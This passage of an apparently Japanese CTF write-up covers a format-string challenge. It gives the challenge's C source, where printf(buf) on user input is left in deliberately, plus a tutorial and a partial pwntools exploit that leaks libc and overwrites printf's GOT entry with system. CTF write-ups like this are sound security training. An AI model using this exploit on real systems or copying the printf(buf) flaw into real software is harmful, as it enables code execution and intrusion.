+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">divide</span><span class="p">(){</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;---------------------------------------------------------------------------------------</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">asciiart</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;/$$$$$$$$              /$$      /$$$$$$   /$$              &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;| $$_____/             | $$     /$$__  $$ | $$              &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;| $$    /$$$$$$/$$$$  /$$$$$$  | $$  </span><span class="se">\\</span><span class="s">__//$$$$$$    /$$$$$$ &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;| $$$$$| $$_  $$_  $$|_  $$_/  |  $$$$$$|_  $$_/   /$$__  $$&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;| $$__/| $$ </span><span class="se">\\</span><span class="s"> $$ </span><span class="se">\\</span><span class="s"> $$  | $$     </span><span class="se">\\</span><span class="s">____  $$ | $$    | $$  </span><span class="se">\\</span><span class="s">__/&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;| $$   | $$ | $$ | $$  | $$ /$$ /$$  </span><span class="se">\\</span><span class="s"> $$ | $$ /$$| $$      &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;| $$   | $$ | $$ | $$  |  $$$$/|  $$$$$$/ |  $$$$/| $$      &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;|__/   |__/ |__/ |__/   </span><span class="se">\\</span><span class="s">___/   </span><span class="se">\\</span><span class="s">______/   </span><span class="se">\\</span><span class="s">___/  |__/</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">intro</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;INTRO:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Have you used printf in C?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;When you use it, it is important to format data to output correctly, especially when ouputting user input.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;When done incorrectly, printf becomes a powerful tool to the user. :sunglasses:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">explain_fmtstr</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;EXPLAIN FMTSTR:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;First off, if you don&#39;t already, you need to understand formatting for printf.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;When using printf, the code should look something like:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;printf(</span><span class="se">\&#34;</span><span class="s">[constant string with formatters]</span><span class="se">\&#34;</span><span class="s">, [input to format 1], [input to format 2], etc...);</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;There are many formatters, for different types of input.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Here are some:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;\%s: string&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;\%c: character&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;\%d: signed integer&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;\%x: hex integer&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;\%p: address&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;\%n: print nothing but write number of previously printed (not number of input) characters to input address (why does this even exist?)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;An example of how this would be used is the following:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;printf(</span><span class="se">\&#34;</span><span class="s">Best girl is \%s \%d, duh!</span><span class="se">\\</span><span class="s">n</span><span class="se">\&#34;</span><span class="s">, </span><span class="se">\&#34;</span><span class="s">Amy</span><span class="se">\&#34;</span><span class="s">, 2);</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This would output:&#34;</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Best girl is %s %d, duh!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;Amy&#34;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;However, the formatters can have much more specifications.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;A more complete template to formatters would be:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;\%[parameter][flags][width][.precision][length]type</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;The most important things are:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>	
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Paramater - by using &#39;n$&#39; between the &#39;\%&#39; and type, you can choose which input position the format string takes the value from.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Width - sets the minimum amount of characters to be printed, will print spaces unless character specified before width&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Length - Can add modifiers before type such as to change the size of the input, such as &#39;hh&#39; to take a byte, or &#39;ll&#39; to take a long long</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Here&#39;s one more example with the new format options:&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;printf(</span><span class="se">\&#34;</span><span class="s">\%3$s, please go on a date with me in \%6$020lld days!</span><span class="se">\\</span><span class="s">n</span><span class="se">\&#34;</span><span class="s">, </span><span class="se">\&#34;</span><span class="s">Amy Wan</span><span class="se">\&#34;</span><span class="s">, </span><span class="se">\&#34;</span><span class="s">Amy Tu</span><span class="se">\&#34;</span><span class="s">, </span><span class="se">\&#34;</span><span class="s">Yusa Ko</span><span class="se">\&#34;</span><span class="s">, 3, 21, 694203141592653);</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This would output:&#34;</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%3$s, please go on a date with me in %6$020lld days!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;Amy Wan&#34;</span><span class="p">,</span> <span class="s">&#34;Amy Tu&#34;</span><span class="p">,</span> <span class="s">&#34;Yusa Ko&#34;</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">694203141592653</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You can find more details on wikipedia.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">explain_exploit</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;EXPLAIN EXPLOIT:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;All that format stuff is great and all, but how would it possibly be used in an exploit?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well, if the programmer formats the output correctly, it can&#39;t. :weary:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;However, what if you, as the user, were able to control the first parameter that uses the formatters? :think:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;A common beginner mistake is to write code like &#39;printf(buf);&#39;, where buf is a string the user can write to.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;When this is the case, whatever formatters you input to buf will still be used! :eyes:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You may be thinking, &#39;what does the formatters do if there aren&#39;t any other parameters to use tho?&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well the magical thing is, printf&#39;s inputs are on the stack, so you are able to print and modify stack addresses as if they are inputs!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;In the exploit, try typing &#39;\%p \%p \%p \%p \%p \%p \%p&#39;, and you will see that you are in fact leaking addresses.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Even more lucky for you, libc addresses seem to always find their way onto the stack!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;In gdb peda, an easy way to view the stack is just the command &#39;stack [number addreses to output]&#39;.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Also remember that weird &#39;\%n&#39; formatter?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well, because it can write to an address on the stack, if you are able to place an address on the stack you want to write to, you can than write to it!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Luckily, it is **almost always** the case the input string is located on the stack, so you can just write addresses on the input string.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;What if you overwrote a got address causing a function to call something other than the intended libc address it&#39;s supposed too? :eyes:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;And a tip, to print some number of chars that are used as the &#39;\%n&#39; write value, just type &#39;\%[number chars]c&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Another tip, rather than writing all characters at once (where you&#39;d have to print a ton of characters), split the write into bytes or shorts with the size length modifier.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Overall, your goal should be:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;1) leak libc address from stack.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;2) Overwrite a function got with system so you can put &#39;/bin/sh&#39; into it.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;3) Put &#39;/bin/sh&#39; into that function</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Don&#39;t forget the input position modifier for formatters, it makes it easier to get the stack offsets you want.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Btw, I heard pwntools can make writes with printf way easier than by hand (specifically the fmtstr_payload function).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;To use it, make sure you set the pwntools context arch correctly.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">resources</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;RESOURCES:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I know, I&#39;m too nice, giving you even more help.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Here are a few maybe helpful links:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Video tutorial (and great channel): https://www.youtube.com/watch?v=t1LH9D5cuK4&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wikipedia printf formatters: https://en.wikipedia.org/wiki/Printf_format_string&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Pwntools fmtstr: https://docs.pwntools.com/en/stable/fmtstr.html</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">learn</span><span class="p">(){</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;WANT TO LEARN:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Before we start, would you like to learn about format string exploits?[y/N] (also, I fixed the overflow here :clown:)&#34;</span><span class="p">);</span>
+
+	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span> <span class="o">||</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;Y&#39;</span><span class="p">){</span>
+		<span class="n">divide</span><span class="p">();</span>
+
+		<span class="n">explain_fmtstr</span><span class="p">();</span>
+
+		<span class="n">divide</span><span class="p">();</span>
+
+		<span class="n">explain_exploit</span><span class="p">();</span>
+
+		<span class="n">divide</span><span class="p">();</span>
+
+		<span class="n">resources</span><span class="p">();</span>
+	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I see, you must be a natural!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;EXPLOIT:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Here we go, I&#39;ll be nice and read three inputs, and all three will be outputted with printf as its first paramter.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;However, no overflows, I won&#39;t take more than 128 characters at a time. :pensive:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Give me your first input:&#34;</span><span class="p">);</span>
+
+	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Nice, now give me your second input:&#34;</span><span class="p">);</span>
+
+	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>	
+
+	<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Alright, one last input:&#34;</span><span class="p">);</span>
+
+	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>	
+
+	<span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">farewell</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;FAREWELL:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hopefully something worked right!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Adios!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+	<span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
+        <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
+
+	<span class="n">asciiart</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">intro</span><span class="p">();</span>
+	
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">learn</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">vuln</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">farewell</span><span class="p">();</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>FSBが3回行えるようになっています。それぞれでやることは以下の通りです。</p>
+<ol>
+<li>スタックから libc アドレスのリーク</li>
+<li>GOT overwrite で printf を systemに。</li>
+<li>引数 &lsquo;/bin/sh&rsquo; をセット。</li>
+</ol>
+<p><br /></p>
+<p>gdb を使って最初の fgets() のところでスタックの中身を確認し、<code>&lt;puts+378&gt;</code> があるのを見つけたのでそれを使いました。</p>
+<pre>
+gef➤  x/16gx $rsp
+0x7fffffffe160:	0x0000000000405060	0x00007ffff7fc54a0
+0x7fffffffe170:	0x0000000000000000	0x00007ffff7e86709
+0x7fffffffe180:	0x000000000000000a	0x00007ffff7e86b63
+0x7fffffffe190:	0x0000000000000058	0x00007ffff7fc46a0
+0x7fffffffe1a0:	0x0000000000402008	0x00007ffff7e7b76a
+0x7fffffffe1b0:	0x0000000000000000	0x00007fffffffe1e0
+0x7fffffffe1c0:	0x0000000000401070	0x0000000000000000
+0x7fffffffe1d0:	0x0000000000000000	0x0000000000401162
+
+gef➤  x/4gx 0x00007ffff7e7b76a
+0x7ffff7e7b76a &lt;puts+378>:	0xffff77850ffff883	0x1f0ffffffef7e9ff
+0x7ffff7e7b77a &lt;puts+394>:	0x01b9000000000084	0x0f41f0d089000000
+</pre>
+<p>これが FSBを使って 15番目（<code>%15$016lx</code>）で取れるのは、何度かトライ＆エラーで見つけました。</p>
+<p><br /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="hl"><span class="lnt"> 5
+</span></span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="hl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;143.198.127.103&#39;</span><span class="p">,</span> <span class="mi">42002</span><span class="p">)</span>
+<span class="c1"># s = process(&#39;./fmtstr&#39;)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./fmtstr&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.31.so&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="c1"># Before we start, would you like to learn about format string exploits?[y/N] (also, I fixed the overflow here :clown:)</span>
+<span class="c1"># N</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:clown:)</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;N&#39;</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Give me your first input:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;%15$016lx&#34;</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">378</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+
+<span class="c1"># AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x</span>
+<span class="c1"># AAAA00b682a1.00000000.00b682e5.ec6378e0.00000000.41414141.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838</span>
+<span class="c1"># ==&gt; 6</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">printf</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">})</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Nice, now give me your second input:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
